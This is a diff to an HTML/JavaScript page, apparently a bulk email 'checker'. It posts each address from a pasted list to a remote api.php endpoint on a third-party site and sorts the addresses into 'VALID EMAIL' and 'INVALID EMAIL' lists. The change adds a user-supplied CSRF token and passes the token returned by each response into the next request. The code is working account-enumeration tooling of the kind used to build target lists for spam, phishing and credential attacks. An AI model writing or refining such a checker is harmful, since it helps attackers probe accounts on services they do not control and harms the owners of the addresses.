@@ -242,12 +242,17 @@ p {
 	 <script src="jquery-1.js"></script>
 	<script type="application/javascript">
     function hajar(){
+	    var person = prompt("Please enter your CSRF", "MKIyDIqTBLFwRT6LY9SKLZkDNeAIa7h4XT1FU=");
+if (person == null || person == "") {
+    
+} else {
+    var newcsrf=person;
         document.getElementById('hajarbro').disabled=true;
         var url = document.getElementById('mailist').value.split('\n');
         var link="http://www.catholichub.tv/anodaz/api.php";
         var current = 0;
         var total = url.length;
-        var newcsrf=false;
+        
         var output = new Array();  
         var validtitle=0;
         var invalidtitle=0;
@@ -281,47 +286,32 @@ document.getElementById("loadd").innerHTML='<div id="fountainG"><div id="fountai
 
         function ajax(){
             if(current < total){
-				var emailnya = url[current];
-				if (newcsrf){
-					newcsrf=false;
+				var emailnya = url[current];			
 					document.getElementById("load").innerHTML='<h5 style="color: #FFF;font-weight: bold;"><b>New CSRF ['+current+'/'+total+']' + emailnya + '</b></h5>';//'<img src="ajax-loader.gif" />';
                     var http = new XMLHttpRequest();
                     http.open("POST", link, true);
                     http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
-                    http.send("email=" + url[current]+"&csrf=new");
-                }
-                else{
-            	   document.getElementById("load").innerHTML='<h5 style="color: #FFF;font-weight: bold;"><b>['+current+'/'+total+']' + emailnya + '</b></h5>';//'<img src="ajax-loader.gif" />';
-                    var http = new XMLHttpRequest();
-                    http.open("POST", link, true);
-                    http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
-                    http.send("email=" + url[current]);
-                }
-				
+                    http.send("email=" + url[current]+"&csrf="+newcsrf);	
                 current++;
                 http.onreadystatechange=function() {
                     if (http.readyState == 4) {
                         output = JSON.parse(http.responseText);
                         
-						if(output["accountExist"] == null){
-						   // alert(output["csrf"]);
-							newcsrf=true;
-							current--;
-							
-						}else if(output["accountExist"])
+						if(output["status"])
 						{
                             alertify.success('VALID EMAIL : ' +output["email"]);
                             validtitle++;
                              document.getElementById("validtitle").innerHTML=validtitle+" VALID-EMAILS";
 							$('#valid').append(output["email"] + "\n");
 							
-						}else if(!output["accountExist"]){
+						}else{
                             alertify.error('INVALID EMAIL : ' +output["email"]);
 							invalidtitle++;
                              document.getElementById("invalidtitle").innerHTML=invalidtitle+" INVALID-EMAILS";
 							$('#die').append(output["email"] + "\n");
 							
 						} 
+			    newcsrf = output["csrf"];
                         ajax();
                     }
                 }
@@ -351,6 +341,7 @@ document.getElementById("loadd").innerHTML="";
             }
         }
     }
+}
 </script>
   </head>
   <body>
